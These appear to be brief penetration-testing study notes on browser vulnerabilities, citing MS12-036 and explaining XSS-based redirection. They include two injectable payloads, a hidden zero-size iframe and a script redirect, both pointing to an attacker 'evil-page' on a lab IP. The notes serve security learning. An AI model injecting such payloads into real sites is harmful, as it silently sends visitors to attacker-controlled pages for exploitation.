# Browser vulnerabilities

We have mostly been looking at vulnerabilities found in sites that let's us either attack the user or the underlying system. But there is also another sort of vulnerability. When the browser itself is vulnerable and can lead to remote code execution.

And example of this is ms12-036. 


## XSS and redirection

Most attacks against browsers is based on social engineering. The idea is that you trick the user to click on a link. That link, or that website, is usually controlled by the attacker in one way or another. It can be a legitimate site that the attacker is using, or it might be the attackers own server.

Foe example, if the attacker is able to inject code html or javascript the attacker can redirect the user to load another page.


One technique is to hide the redirection in a frame, this way the user won't even notice that an external page is being loaded. 
```
<iframe SRC="http://192.168.1.101/evil-page" height = "0" width ="0"></iframe>
```
A less subtle technique is by just redirecting the user, with a script like this:
```
<script>location.href='http://192.168.1.101/evil-page';</script>
```